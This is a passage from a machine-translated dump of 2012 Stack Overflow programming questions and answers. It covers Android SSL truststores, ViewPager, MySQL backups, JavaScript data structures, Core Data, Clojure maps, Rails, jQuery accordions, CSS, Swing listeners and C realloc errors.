W/System.err(4194):     at org.apache.http.impl.client.naf.redirect.NafRequestExecutorWrapperRedirectionHandler.executeRequestSending(NafRequestExecutorWrapperRedirectionHandler.java:73)
W/System.err(4194):     at org.apache.http.impl.client.naf.auth.NafHttpAuthStrategyDefault.sendFirstRequest(NafHttpAuthStrategyDefault.java:487)
W/System.err(4194):     at org.apache.http.impl.client.naf.auth.NafHttpAuthStrategyDefault.performAuthExecutionUnsafe(NafHttpAuthStrategyDefault.java:388)
W/System.err(4194):     at org.apache.http.impl.client.naf.auth.NafHttpAuthStrategyDefault.performAuthExecution(NafHttpAuthStrategyDefault.java:200)
W/System.err(4194):     at org.apache.http.impl.client.AbstractHttpClient.execute(AbstractHttpClient.java:556)
W/System.err(4194):     at org.apache.http.impl.client.AbstractHttpClient.execute(AbstractHttpClient.java:505)
W/System.err(4194):     at org.apache.http.impl.client.AbstractHttpClient.execute(AbstractHttpClient.java:483)
W/System.err(4194):     at com.wmmccreedy.vce.AgConnection.submitInfo(AgConnection.java:111)
W/System.err(4194):     at com.wmmccreedy.vce.LoginSubmitActvity$DownloadWebPageTask.doInBackground(LoginSubmitActvity.java:199)
W/System.err(4194):     at com.wmmccreedy.vce.LoginSubmitActvity$DownloadWebPageTask.doInBackground(LoginSubmitActvity.java:1)
W/System.err(4194):     at android.os.AsyncTask$2.call(AsyncTask.java:185)
W/System.err(4194):     at java.util.concurrent.FutureTask$Sync.innerRun(FutureTask.java:306)
W/System.err(4194):     at java.util.concurrent.FutureTask.run(FutureTask.java:138)
W/System.err(4194):     at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1088)
W/System.err(4194):     at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:581)
W/System.err(4194):     at java.lang.Thread.run(Thread.java:1019) 
```

现在，这可以正常工作……大约 50% 的时间。我通过创建一个while循环来“解决”这个问题。它继续重新创建 httpclient 客户端并尝试一遍又一遍地访问服务器，直到它工作，通常只尝试 1 到 2 次（我见过的最多是 4 次）。显然，这是非常低效的。

我已经将问题缩小到我上面发布的类，因为如果我只创建一次 httpclient 并尝试使用同一个类多次访问该站点，它要么总是失败，要么总是成功，这取决于是否我有一个“好”的 httpclient，或者一个“坏”的 httpclient。但是，如果我每次尝试访问网页时都创建 httpclient，它有时会起作用，有时会不起作用。

那么为什么要这样做，我该如何解决呢？为什么它只是间歇性地工作，在客户端的创建之间会发生什么变化？

编辑：解决了！

看来我在我的信任库中留下了一些旧版本的别名，它会随机选择它首先找到的任何一个，但最终并不总是正确的。每个别名都有相同的证书，但每个别名的所有证书的顺序不同。我测试了直到找到正确的商店，删除了其余的，现在一切都很完美。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-27T08:10:02.437

这不是“证书创建”问题。

服务器（对等方）没有向您发送证书。这可能是因为它在其密钥库中找不到由您的信任库信任的人签名的密钥。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-10-08T12:42:46.507

这是 Apache HTTP 客户端中的一个问题（在 Android 2.3 上观察到）。加载密钥库时，证书以随机顺序加载到内存数据结构中。Apache HTTP Client PKIX 路径校验逻辑错误。它从服务器的证书开始并查找密钥库，如果查找的第一个证书是CA证书，则链构建成功并且验证成功，但是，如果查找的第一个证书是服务器的证书，则Apache HTTP客户端放弃并且验证失败。

因此，请确保您的密钥库中没有服务器和中间 CA 证书。

# android - 我可以在 viewpager 中更改视图的宽度吗？

> ID：10772361
> 
> 赞同：1
> 
> 时间：2012-05-27T07:29:57.377
> 
> 标签：android, layout, android-viewpager

我目前正在使用带有 3 个片段的 Viewpager。我想知道是否可以更改第一个片段的宽度。

实际上，当您使用平板电脑观看时，我尝试对 android play 商店中的类别菜单执行此操作，它看起来像一个片段，但滑动到它时并没有占用所有空间，因此您仍然可以看到它旁边的片段（我不知道我是否清楚）。我想知道是否可以通过将第一个片段的宽度从 MATCH_PARENT 更改为固定值来简单地做到这一点，我什至不知道这样做的结果是否会很好。

我尝试了 setLayoutParams() ，将其设置在 xml 中，似乎没有任何效果。片段仍然匹配父级。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-27T10:02:09.760

实际上，您可能想尝试在 中的页面上设置负边距`ViewPager`，使用[`setPageMargin(int)`](http://developer.android.com/reference/android/support/v4/view/ViewPager.html#setPageMargin%28int%29). 另请参阅我不久前在类似问题上提供的这个答案：

*   [我可以设置 viewpager 的项目宽度吗？](https://stackoverflow.com/questions/10168087/can-i-set-viewpagers-item-width/10168134#10168134)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-27T07:34:26.723

对于 ViewPager，它不受支持。您必须编写自己的 ViewGroup 类，或者您可以尝试我在[这个问题](https://stackoverflow.com/questions/10569208/swipe-half-page-in-a-viewpager-from-compatibility-pack/10575613#10575613)中回答的内容。

# java - Android 我在我的代码中写了从服务器下载 mp3 文件的一些错误

> ID：10772362
> 
> 赞同：-4
> 
> 时间：2012-05-27T07:30:01.370
> 
> 标签：java, android, save, mp3

错误：java.io.FileNotFoundException：/mnt/sdcard/sura-001.mp3（权限被拒绝）

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-27T07:41:28.707

您可以从以下网址获取帮助

[java.io.FileNotFoundException：（权限被拒绝）](https://stackoverflow.com/questions/1301577/java-io-filenotfoundexception-permission-denied)

[http://codingexplorer.wordpress.com/2009/07/13/java-io-filenotfoundexception-with-permission-denied/](http://codingexplorer.wordpress.com/2009/07/13/java-io-filenotfoundexception-with-permission-denied/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-27T07:43:24.383

```
 <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"></uses-permission>
    <uses-permission android:name="android.permission.INTERNET"></uses-permission> 
```

检查是否添加了权限...

**更新：：**

这就是清单文件的样子

```
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
      package="com.com.com"
      android:versionCode="1"
      android:versionName="1.0">
    <application android:icon="@drawable/icon" android:label="@string/app_name">
        <activity android:name=".Activity"
                  android:label="@string/app_name">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
    </application>
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"></uses-permission>
    <uses-permission android:name="android.permission.INTERNET"></uses-permission>   
</manifeast> 
```

# mysql - 将 .sql 转换为 .bak

> ID：10772371
> 
> 赞同：3
> 
> 时间：2012-05-27T07:32:24.660
> 
> 标签：mysql, sql, sql-server

我在 MySQL 中有一个数据库，我需要在 .bak 文件中备份它。我发现了很多关于将 .bak 转换为 .sql 的主题，但没有找到关于 .sql 到 .bak 的主题。可行吗？如果是这样 - 如何？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-27T07:45:46.460

`*.bak`扩展文件是一个 SQL Server 备份文件，`*.sql`是一个包含普通 SQL 命令的 sql 脚本文件。

您不能只将 *.sql 文件转换为 *.bak。

可能你想要做的是：恢复备份文件，然后将其导入 MYSQL。

这是您恢复 *.bak 文件的方式：

[http://msdn.microsoft.com/en-us/library/ms177429%28SQL.90%29.aspx](http://msdn.microsoft.com/en-us/library/ms177429%28SQL.90%29.aspx)

然后将其导入mysql：

[http://forums.mysql.com/read.php?65,72796,72796](http://forums.mysql.com/read.php?65,72796,72796)

# diagram - 第一切序列图响应

> ID：10772375
> 
> 赞同：0
> 
> 时间：2012-05-27T07:33:48.180
> 
> 标签：diagram, sequence-diagram

这是我的第一个剪切序列图的图像：

![在此处输入图像描述](../Images/111ae906161497e86075f1c230f0391c.png)

我的问题是：retrieveStockInfo(stkID,stkInfo) 方法获取想要显示给客户的数据。目前，我对激活“框”有回应。这个对吗？我需要将其他任何东西退还给实际客户吗？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-15T08:24:02.617

是的，您需要将信息返回给客户，否则他们永远不会知道发生了什么！

您可能还想加入错误处理序列。这些在序列图中经常被遗忘。

# javascript - 什么javascript数组、嵌套数组、对象最适合搜索

> ID：10772377
> 
> 赞同：1
> 
> 时间：2012-05-27T07:34:06.450
> 
> 标签：javascript, jquery

我正在尝试构建一个颜色结构，每个项目有 3 个数据。比如红色有x和y，蓝色有x和y等。所以这3条数据是`color, x, y`

我需要什么结构才能根据颜色轻松读取 x 和 y。我通常这样做`push(color, x, y)`，但这在这里行不通，因为我需要通过颜色快速搜索而不需要循环。我在这里需要什么结构，以及如何设置和获取它。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-27T07:39:29.397

一个简单的对象（散列）呢？

```
// Initial creation
var colors = {
  blue: { x: 897, y: 98 },
  red: { x: 43, y: 1334 },
  yellow: { y: 12 }
}

// Adding new element to existing object
colors['green'] = { x: 19 };

// Accessing them
console.log(colors.blue.x);
console.log(colors.yellow.y);

// Accessing them with name in var
var needed = 'green';
console.log(colors[needed].x);
console.log(colors[needed]['x']); 
```

还是我理解错了？

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-05-27T07:40:57.130

你在找字典之类的东西吗？！？

```
var colorArray = {};
colorArray["red"] = {
    x: 100,
    y: 200
};
colorArray["blue"] = {
    x: 222,
    y: 200
};
alert(colorArray["red"].x);​ 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-05-27T07:40:08.270

```
var colors = {
    red  : { x : 42, y : 7 },
    blue : { x : .., y : .. },
    ...
};

alert(colors.red.x); 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-05-27T07:48:19.260

或者，如果您还需要数组中的颜色

```
var colors = {
 blue: { color:"blue", x: 100, y: 200 },
 red: { color:"red", x: 50, y: 300 },
 yellow: { color:"yellow", x: 30 y: 700 }
} 
```

您也可以使用字符串“常量”：

```
var RED = "red";

var colors = {};
 colors[RED] = { color: RED, x: 100, y: 200 };
 ... 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-05-27T07:42:51.577

```
var colors = [
  {color: 'blue',  x: 897, y: 98 },
  {color: 'red', x: 25,  y: 1334 },
  {color: 'yellow', x: 50, y: 12 }
]

for(var i in colors) {
  console.log(colors[i].color);
  console.log(colors[i].x);
  console.log(colors[i].y);
}
// To insert into colors

colors.push({color: 'pink', x: 150, y: 200}); 
```

或者如果你有这样的结构

```
var colors = [
   ['red', 837, 98], 
   ['blue', 25, 144], 
   ['yellow', 50, 12]
]; 
```

然后

```
for(var i in colors) {
  console.log(colors[i][0]); // output: red, yellow ...
  console.log(colors[i][1]); // output: 837, 25 ..
  console.log(colors[i][2]); // output: 98, 144 ..
}

and to insert into colors for this structure
colors.push(['pink', 150, 200]) 
```

或者

```
var colors = {
  blue: { x: 58, y: 100 },
  red: { x: 43, y: 1334 },
  yellow: {x: 254, y: 12 }
} 
```

然后

```
for(var i in colors) {
  console.log(colors[i].blue.x);
  console.log(colors[i].blue.y);
  // or
  console.log(colors[i]['blue'].x);
  // or like
  console.log(colors[i]['blue']['x']);
}

// and to insert for this sturcture

colors.pink= {x: 150, y: 200}; 
```

# objective-c - Using a NSFetchedRequest or a NSSortedDescriptior on a to-many property?

> ID：10772379
> 
> 赞同：1
> 
> 时间：2012-05-27T07:34:12.110
> 
> 标签：objective-c, core-data

Say we have a entity `Company` that has a to-many relationship to the `Employee` entity via the `employees`.

If I want to find the last created `Employee` (assume `Employee` has a `NSDate` property `created`), which of these two approaches is better?

*   create a `NSFetchRequest` on `Employee`, restricted to `"company == %@", someCompany`, sort by `created`, and set the `fetchLimit` to 1
*   or use `sortedArrayUsingDescriptors:` on `someCompany.employees` with a `NSSortDescriptor` on `created` and take the first?

While the second approach seems more straight forwards, I'm concerned about the actual processing. The first approach would allow the system to tailor a custom query, while the second does some in-memory sorting? I guess it boils down to whether to-many relationships are lazy or not.

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-27T11:06:08.760

In my personal experience I would take the first approach.

First of all you don't need to perform a two steps operation like the second. In addition, you can have full control of the element (you set the fetch limit to 1) you grab with the fetch request (e.g. you can specify the properties to retrieve using `setPropertiesToFetch` and delegate Core Data to fire faults for you).

Then, when you do `someCompany.employees` you retrieve few objects (say 20) that are faults (you grab first theirs skeleton) but they are in memory and they occupy it. When you apply a sort descriptor (maybe at that point some sort of fault will fired on them), you end up with 19 objects that are in memory but are not useful for the application lifecycle.

**Personal Note**

Even if I'm a good programmer, I would trust on Core Data framework optimizations and I would take the first way. :-)

Hope it helps.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-27T09:14:29.767

Core Data uses lazy loading for this type of relationship. Thus, the first approach seems to be better. But I recommend filling your database with a lot of records and testing both of them. You may also want to read [Core Data Performance section](https://developer.apple.com/library/mac/#documentation/Cocoa/Conceptual/CoreData/Articles/cdPerformance.html).

# continuous-integration - Debian 软件包变更日志自动填充

> ID：10772382
> 
> 赞同：0
> 
> 时间：2012-05-27T07:34:21.320
> 
> 标签：continuous-integration, package, debian, deb

我有构建一些项目的持续集成系统。现在我将添加自动 deb 包创建阶段。但是编写 .deb 假设每次都更改更改日志。

所以我有几个问题：1）如何自动设置 Git 的评论和提交作者以导出到 debchange 实用程序？2）如何自动更改版本/发布？3）如何通过传递一些小版本来避免巨大的变更日志（每天多次提交会烧毁变更日志阅读者的大脑）？4) 如果 debian 目录（带有更改日志、控制和规则文件）不在存储库中 - 它应该保存在哪里？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-28T05:19:54.977

您可以使用 git-buildpackage 中的 git-dch。

# clojure - Clojure 的地图：键和值的顺序是否相同？

> ID：10772384
> 
> 赞同：19
> 
> 时间：2012-05-27T07:34:37.920
> 
> 标签：clojure, hashmap

`(= m (zipmap (keys m) (vals m)))` 在 Clojure 1.3+中依赖 可以吗？

在某些情况下，具有这种行为会使代码更具可读性，例如

```
(defn replace-keys [smap m]
  (zipmap (replace smap (keys m)) (vals m))) 
```

对比

```
(defn replace-keys [smap m]
  (into {} (for [[k v] m] [(smap k k) v])) 
```

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2012-05-27T08:19:44.260

是的，如果改变的话，很多clojure 都会崩溃。

地图存储为树，两个函数以相同的顺序遍历同一棵树。

* * *

## 回答 #2

> 赞同：15
> 
> 时间：2015-12-07T14:57:49.540

我可以（正式）确认这个问题的答案是肯定的。`keys`Clojure 1.6 中更新了和的文档字符串`vals`以提及这一点（请参阅[http://dev.clojure.org/jira/browse/CLJ-1302](http://dev.clojure.org/jira/browse/CLJ-1302)）。

# ruby - 在 Rails 中使用 STI 模型时出现 ActiveRecord::UnknownAttributeError

> ID：10772388
> 
> 赞同：0
> 
> 时间：2012-05-27T07:35:44.953
> 
> 标签：ruby, ruby-on-rails-3

我做了以下模型：

```
class Request < ActiveRecord::Base
end

class UrgentRequest < Request
  has_one:note
end

class Note < ActiveRecord::Base
  attr_accessible :request_id,.... 
  belongs_to :urgent_request, :foreign_key=>'request_id', :class_name=>'Request'
end 
```

在我的控制器中，我设置了一个操作来创建一个`UrgentRequest`对象：

```
def new_scheduled_request
  @request = UrgentRequest.new
  @request.build_note #<-- getting error here

  respond_to do |format|
    format.html # new.html.erb
    format.json { render json: @request }
  end
end 
```

我收到以下错误：

```
ActiveRecord::UnknownAttributeError in RequestsController#new_urgent_request
unknown attribute: urgent_request_id 
```

行号是我调用`build_note`呼叫的位置。页面上的表单应该是嵌套表单。这是怎么回事，我该如何解决？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-27T07:41:24.420

呃，没关系，我发现了这个问题。显然，我必须在 has_one:note 关联中的 UrgentRequests 模型中明确提及外键和类名参数。现在工作正常！

# c# - 如何从 PostgreSQL 写入/读取二进制数据？

> ID：10772393
> 
> 赞同：1
> 
> 时间：2012-05-27T07:36:58.837
> 
> 标签：c#, sql, postgresql, binary

我想通过直接 SQL 查询（SQLCommand）以二进制格式（PostgreSQL 中的 varbinary/binary/etc 和 C# 中的 byte[]）写入/读取哈希，但不知道该怎么做。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-27T08:15:56.750

您可以使用 Devart 作为 PostgreSQL 的 ADO.NET 提供程序，然后执行类似以下操作：http: [//www.devart.com/dotconnect/postgresql/docs/Devart.Data.PostgreSql~Devart.Data.PostgreSql.PgSqlBlob.html](http://www.devart.com/dotconnect/postgresql/docs/Devart.Data.PostgreSql~Devart.Data.PostgreSql.PgSqlBlob.html)

# javascript - Javascript Accordion 不工作，DD 不向下滑动

> ID：10772394
> 
> 赞同：0
> 
> 时间：2012-05-27T07:37:04.433
> 
> 标签：javascript, jquery, html, accordion

我有一个 Javascript Accordiong，目前它在页面加载时显示第一个 dd，然后当您单击 dt 标记时，打开的 dd 应该关闭并且 dt 中的 dd 标记单击显示幻灯片。

但是 atm 第一个 dd 在加载时显示，打开的 dd 在单击另一个 dt 时关闭，但下一个 dd 不显示。

有人可以帮帮我吗 ：/

我的 JS：

```
//Accordion  - Hides open, and opens the clicked
    $(document).ready(function() {
        $('dd:not(:first)').hide(); //hides all but the first dd (the content under the headings)
        $('dt').click(function() {
            $('dd').slideUp('slow'); //slides up current dd 
            $(this).parent('dt').next('dd').slideDown('slow');
        });
    }); 
```

这是我的html：

```
 <!DOCTYPE HTML>
<html>
<head>
    <title>Hobbies</title>
    <script src="js/jquery.js" type="text/javascript"></script>
    <script type="text/javascript" src="js/jscript.js"></script>
    <link rel="stylesheet" href="style\main.css" media="screen" />
</head>
<body>
<div id="container">
        <a name="top"></a>
    <div>
        <ul class="menu">
            <li><a href="index.html">Home</a></li>
            <li><a href="schedule.html">Schedule</a></li>
            <li><a href="resume.html">Resume</a></li>
            <li><a href="contact.html">Contact</a></li>
            <li><a href="hobbies.html">Hobbies</a>
                <ul>
                    <li><a href="hobbies.html#uni">University</a></li>
                    <li><a href="hobbies.html#games">Gaming</a></li>
                    <li><a href="hobbies.html#chess">Chess</a></li>
                    <li><a href="hobbies.html#golf">Golf</a></li>
                    <li><a href="hobbies.html#music">Harmonica</a></li>
                </ul>
            </li>
            <li><a href="image.html">Images</a></li>
        </ul>
    </div>
    <div id="contenthobby">
    <div>
    <dt><a name="uni"><h2>University</h2></a></dt>
        <dd>
        <div class="pa">
                <p> content
            </div>
            <div class="pic">
                <img src="http://physics.uq.edu.au/ap/cosmicflow/wp-content/uploads/2011/11/uq_logo.gif" 
                alt="Error Loading Image">
                <p>This is the UQ logo</p>
                <img src="http://maps.googleapis.com/maps/api/staticmap?center=-27.497899,153.013222&amp;zoom=16&amp;size=250x250&amp;markers=-27.497899,153.013222&amp;sensor=false" alt="The University of Queensland"/>
                <p>This is UQ</p>
            </div>
            <a href="#top">Return to Top</a>
        </dd>
    </div>
    <div>
    <dt><a name="games"><h2>Gaming</h2></a></dt>
        <dd>
        <div class="pa">
            <p>I love to play games, even though it wastes so much time and amounts to nothing.
            It allows me to just go into another world. Something amazing when your slaying dragons
            haha.</p>
            <p>SKYRIM!</p>
            <p>What I Like About it</p>
            <ol>
                <li>Able to immerse yourself into the game</li>
                <li>Gets the adrenalin pumping when your in an intense fight</li>
                <li>Allows for late night fun</li>
            </ol>
        </div>
        <div class="pic">
            <img src="http://www.darylh.com/images/articleimages/SkyrimLogo.png"
            alt="Error loading image: http://www.darylh.com/images/articleimages/SkyrimLogo.png">
            <p>This is the game logo for skyrim</p>
            <iframe width="320" height="240" src="http://www.youtube.com/embed/ARaOOKafLEw"></iframe>
            <p>This is a video of the fun shout in skyrim.</p>
        </div>
        <a href="#top">Return to Top</a>
        </dd>
    </div>
    <div>
    <dt><a name="chess"><h2>Chess</h2></a></dt>
        <dd>
        <div class="pa">
            <p> I love playing chess. It is a good way to unwind, will keeping your mind
            sharp. It allows you to hone your skills and adapt your way of thinking.</p>
            <p>Chess is a game played by men and boys alike, and this is why i believe 
            it is essential to a persons growth. Hence why I play it.</p>
            <p>What I Like About it</p>
            <ol>
                <li>Sharpens your mind</li>
                <li>Fun to work out the problem and beat your opponenet</li>
                <li>Gives you a clearer outlook on the world</li>
            </ol>
        </div>
        <div class="pic">
            <img src="http://www.graemeanthonypewter.com.au/uploads/image/Armageddon-Chess-Set-2.jpg" alt="chess" height="250" width="250">
            <p>This is an example of a chess set</p>
            <img src="http://upload.wikimedia.org/wikipedia/commons/7/71/ChessPawnSpecialMoves.gif" alt="chess board" width="250" height="250">
            <p>This is a chess move, used by pros</p>
        </div>
        <a href="#top">Return to Top</a>
        </dd>
    </div>
    <div>
    <dt><a name="golf"><h2>Golf</h2></a></dt>
        <dd>
        <div class="pa">
            <p>The sport of golf is one of majesty and finesse. It allows one to realise
            that one cannot focus on where he is, but where he is going, and how he is 
            going to get there!</p>
            <p>What I Like About It</p>
            <ol>
                <li>Its outdoors</li>
                <li>Is fun to play</li>
                <li>Get to drive around in the golf cart</li>
            </ol>   
        </div>
        <div class="pic">
            <img width="250" height="250" src="http://www.ashlargolfclub.com.au/upload/wysiwyg/whatsonIndex/Copy%20of%20Copy%20of%20Golf-Ball-and-Tee.jpg" alt="Golf ball">
            <p>This is a golf ball</p>
            <iframe width="250" height="200" src="http://maps.google.com.au/maps?q=54.909901,25.311652&amp;num=1&amp;t=h&amp;hl=en&amp;ie=UTF8&amp;z=14&amp;ll=54.91103,25.312715&amp;output=embed"></iframe><br /><small><a href="http://maps.google.com.au/maps?q=54.909901,25.311652&amp;num=1&amp;t=h&amp;hl=en&amp;ie=UTF8&amp;z=14&amp;ll=54.91103,25.312715&amp;source=embed" style="color:#0000FF;text-align:left">View Larger Map</a></small>
            <p>This is my favourite golf course</p>
        </div>
        <a href="#top">Return to Top</a>
        </dd>
    </div>
    <div>
    <dt><a name="music"><h2>Harmonica</h2></a></dt>
        <dd>
        <div class="pa">
            <p>I Love playing the harmonica, it allows me to just release my feelings 
            through music.</p>
            <p>It also allows me to learn control, in how to release air, and adjust my 
                mouth to get the perfect pitch and sound</p>
            <p>What I like About It</p>
            <ol>
                <li>Its a musically instrument</li>
                <li>It has soul</li>
                <li>It allows me to unwind after a hard day of work</li>
            </ol>
        </div>
        <div class="pic">
            <img width="250" height="250" src="http://www.harmonicagame.com/help/harmonica_tab_screen.gif" alt="Harmonica">
            <p>These are the chords of a harmonica</p>
            <img width="250" height="250" src="http://www.hoerl.com/Graphics/music_harm_hold.gif" alt="Proper way to hold">
            <p>How to Hold a Harmonica</p>
        </div>
        <a href="#top">Return to Top</a>
        </dd>
    </div>
    </div>
    <footer class="footer">

            <a href="http://jigsaw.w3.org/css-validator/check/referer">
                <img style="border:0;width:88px;height:31px"
                src="http://jigsaw.w3.org/css-validator/images/vcss"
                alt="Valid CSS!" />
            </a>
</footer>
</div>
</body>
</html> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-27T08:27:29.667

**工作演示** [http://jsfiddle.net/UL3V3/1/](http://jsfiddle.net/UL3V3/1/)

好读：API：[http ://api.jquery.com/visible-selector/](http://api.jquery.com/visible-selector/)

`slideToggle` [http://api.jquery.com/?ns0=1&s=slideToggle&go=](http://api.jquery.com/?ns0=1&s=slideToggle&go=)

使用它，您也可以关闭打开`dd`。

休息一下，您可以玩耍并找出行为。

这会有所帮助。B-)

**jQuery代码**

```
 $(document).ready(function() {
        $('dd:not(:first)').hide(); //hides all but the first dd (the content under the headings)
        $('dt').click(function() {
         if ($(this).next('dd').is(":hidden"))
            $('dd').slideUp('slow');//slides up current dd 

            $(this).next('dd').slideToggle('slow');

        });
    });​ 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-27T07:48:19.747

`$(this)`在您的情况下是“dt”，因此您需要找到下一个元素（“dd”）：

```
$('dt').click(function() {
   if ($(this).next().is(":hidden")){
     $('dd:visible').slideUp('slow'); //slides up current dd 
     $(this).next().slideDown('slow');
   }
}); 
```

**EDIT**还添加了一个条件，仅在当前 dd 被隐藏时才为幻灯片设置动画。

# css - CSS - 我的食物菜单在 Firefox 和 IE 上运行良好，但在 Chrome 上不行

> ID：10772396
> 
> 赞同：0
> 
> 时间：2012-05-27T07:37:10.767
> 
> 标签：css

我的食物菜单在 Firefox 和 IE 上运行良好，但在 Chrome 上却完全不行。dt 标签与其他 dd 标签重叠。我试图从问题列表中搜索，但找不到正确的。我多次尝试使用浮动和溢出，但一直无法解决这个问题。

您的建议将不胜感激。我真的很想停止挠头，因为我已经这样做了几个月了。

```
#menucontent dt {
float: left;
padding-right: 5px;
font-weight: bold;
}

#menucontent dd.price {
float: right;
color: #E1DEDE;
}

#menucontent dd.ingredients {
float: left;
width: 100%;
padding: 0px 0px 5px 0px;
color: #FAD98A;
} 
```

可以从此链接单击我的食物菜单 [https://dl.dropbox.com/u/13748701/dinner.html](https://dl.dropbox.com/u/13748701/dinner.html)

它的 CSS 源在这里[https://dl.dropbox.com/u/13748701/style.css](https://dl.dropbox.com/u/13748701/style.css)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-27T07:54:22.460

首先：去掉所有的空`<p>`标签！它们不是必需的。想要在元素之间创建空间？使用`margin`！

对于您的问题：将 a 添加`clear: both;`到 h2\. 所以你得到这个：

```
h2 {
  padding: 3px 15px 0px 0px;
  font-weight: normal;
  font-size: 20px;
  color: #F7E4B5;
  clear: both;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-27T07:45:12.903

尝试在 css 中添加`overflow: hidden;`到您的`dl`元素：

```
#menucontent dl {
  overflow: hidden;
} 
```

# java - 将动作监听器添加到 jpanel

> ID：10772401
> 
> 赞同：6
> 
> 时间：2012-05-27T07:39:20.267
> 
> 标签：java, swing, jpanel, actionlistener, mouse-listeners

我想知道是否有任何方法可以将 ActionListener 添加到 JPanel？我将这些添加到 JButtons 没有问题，但 JPanel 似乎没有这样的方法。

基本上我在一个 JFrame 中有一堆 JPanel 并带有网格布局，我想知道是否有任何方法可以知道用户何时点击了其中一个。

非常感谢任何帮助！

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-05-27T07:44:23.023

动作监听器用于监听动作事件。按钮在使用鼠标按下和释放时（而不是在单击时）或使用键盘（空格键、助记符、键盘快捷键等）按下时触发动作事件。这是一个高水平的事件。鼠标点击是一个更底层的事件，由`MouseListener`.

如果您想处理鼠标点击，请将 MouseListener 添加到您的 JPanel。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-05-27T07:44:51.417

显然你可以使用 AddMouseLitener .. 愚蠢的我..

# c - 使用 Realloc 超过 3 次时出现分段错误

> ID：10772404
> 
> 赞同：0
> 
> 时间：2012-05-27T07:40:03.577
> 
> 标签：c, memory-management

我只是了解内存动态，并做了实验，但仍然卡住了。已经搜索了一些，但没有给出任何结果。

这是我的简单代码：

```
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <conio.h>

    typedef struct kata kata;
    struct kata {
        char string[256];
    };

void load(kata **data)
{
        int len = 0;

        while( len < 5 ) {

            (*data) = (kata *) realloc ((*data), (len + 1) * sizeof(kata));
            printf("copy A - %d\n", len);

            strcpy(data[len]->string, "A");
            len++;
        }
        getch();
}

int main() {    
    kata *data = NULL;

    load(&data);

} 
```

还有我的问题，为什么我调试它时总是出现分段错误（在 3 处）？

非常感谢您的建议

编辑 ：

仍然不知道为什么会发生错误，但是我刚刚找到了解决方案..

只需将 data[len]->string 修改为 (*data)[len].string

任何想法，为什么我们称 data[len]->string 发生一些随机段错误？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-27T07:49:07.020

`data[len]->string`应该~~`(*data)[len]->string`~~ `(*data)[len].string`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-27T08:37:46.340

我不知道为什么代码对你不起作用。我尝试了一个类似的例子，它奏效了。

```
int main(void)
{
  int *ptr = NULL;

  ptr=(int *) realloc(ptr, 1*sizeof(int)); cout<<"1"<<endl;
  ptr=(int *) realloc(ptr, 2*sizeof(int)); cout<<"2"<<endl;
  ptr=(int *) realloc(ptr, 3*sizeof(int)); cout<<"3"<<endl;
  ptr=(int *) realloc(ptr, 4*sizeof(int)); cout<<"4"<<endl;
  ptr=(int *) realloc(ptr, 5*sizeof(int)); cout<<"5"<<endl;
  return 0;
} 
```

我试图运行你的代码。它导致 strcpy 行出现问题。如果你注释掉那一行。它工作正常。

data[len]->string 现在会给你正确的答案。在这里，您为 *data 分配了一个数组。因此，正确的方法是 strcpy((*data)[len].string, "A")。请注意使用点运算符而不是箭头运算符来取消引用字符串。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-27T09:18:37.383

好吧，我相信在 while 循环本身的第二次迭代中使用 strcpy 应该存在访问冲突。我想知道它第二次如何工作并在第三次导致错误。如果有人可以向我解释，我会非常高兴。

# spine.js - 嵌套堆栈响应路由时如何使父堆栈处于活动状态

> ID：10772406
> 
> 赞同：1
> 
> 时间：2012-05-27T07:40:12.980
> 
> 标签：spine.js

## 问题

我正在开发一个相当大的应用程序，但遇到了一个似乎很常见的问题。但是我无法在脊椎组或 SO 上找到任何解决方案。

所以问题是，我如何确保当嵌套堆栈响应路由时父堆栈变为活动状态。这如何正确解决？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-10-09T17:29:14.040

我设法通过简单地`@active`在父控制器中使用路由来解决这个问题。这与`this.active`. 这是我如何做到的一个例子......</p>

```
Spine   = require('spine')
$       = Spine.$

# Controllers
Main      = require('controllers/posts/posts.main')
Nav       = require('controllers/navigation/navigation')

class Posts extends Spine.Controller
  className: 'posts top-controller'

  constructor: ->
    super
    @nav      = new Nav
    @main     = new Main

    @routes
      '/posts/new': ->
        @active()
        @nav.post.active()
        @main.new.active()

      '/posts/suggestion': ->
        @active()
        @nav.normal.active(title: "Groups near by")
        @main.matches.active()

      '/posts/:id': (params) ->
        @active()
        @nav.chat.active()
